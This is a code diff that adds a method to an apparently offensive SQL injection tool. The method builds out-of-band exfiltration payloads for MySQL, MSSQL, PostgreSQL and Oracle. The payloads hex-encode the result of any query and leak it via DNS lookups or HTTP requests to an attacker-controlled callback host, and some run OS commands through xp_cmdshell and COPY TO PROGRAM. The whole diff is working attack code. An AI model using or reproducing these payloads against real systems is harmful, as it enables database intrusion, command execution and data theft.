@@ -20,6 +20,53 @@ class Profile:
     def condition_gte(self, expression: str, pos: int, char: str) -> str:
         return f"{self.substring(expression, pos)}>='{char}'"
 
+    def direct_payload(self, base: str, expression: str, prefix: str, domain: str) -> str | None:
+        """Return a payload that exfiltrates the full value as HEX in one DNS/HTTP hit.
+        Returns None if this profile does not support direct mode."""
+        host = f"{prefix}.{domain}"
+        if self.name == "mysql":
+            return (
+                f"{base}' AND LOAD_FILE(CONCAT('\\\\\\\\',HEX(({expression})),"
+                f"'.{host}\\\\x'))-- -"
+            )
+        if self.name == "mysql-stacked":
+            return (
+                f"{base}'; SELECT LOAD_FILE(CONCAT('\\\\\\\\',HEX(({expression})),"
+                f"'.{host}\\\\x'));-- -"
+            )
+        if self.name == "mssql":
+            return (
+                f"{base}'; EXEC master..xp_dirtree '//'+"
+                f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expression})),2)+"
+                f"'.{host}/x'--"
+            )
+        if self.name == "mssql-cmdshell":
+            return (
+                f"{base}'; EXEC master..xp_cmdshell 'nslookup '+"
+                f"CONVERT(VARCHAR(MAX),CONVERT(VARBINARY(MAX),({expression})),2)+"
+                f"'.{host}'--"
+            )
+        if self.name == "postgres-dblink":
+            return (
+                f"{base}';SELECT dblink_connect('host='||"
+                f"encode(({expression})::bytea,'hex')||"
+                f"'.{host} user=a password=a dbname=a')--"
+            )
+        if self.name == "postgres-program":
+            esc = host.replace("'", "'\"'\"'")
+            return (
+                f"{base}';DO $$ DECLARE v TEXT; BEGIN "
+                f"SELECT encode(({expression})::bytea,'hex') INTO v; "
+                f"EXECUTE 'COPY (SELECT 1) TO PROGRAM ''nslookup '' || v || ''.{esc}'''; "
+                f"END $$;--"
+            )
+        if self.name == "oracle-http":
+            return (
+                f"{base}'||(SELECT UTL_HTTP.REQUEST('http://'||"
+                f"RAWTOHEX(UTL_RAW.CAST_TO_RAW(({expression})))||'.{host}/') FROM dual)||'"
+            )
+        return None  # sqlite variants: no clean way to embed value in DNS
+
     def payload(self, base: str, condition: str, callback_host: str) -> str:
         if self.name == "sqlite-lab":
             return (
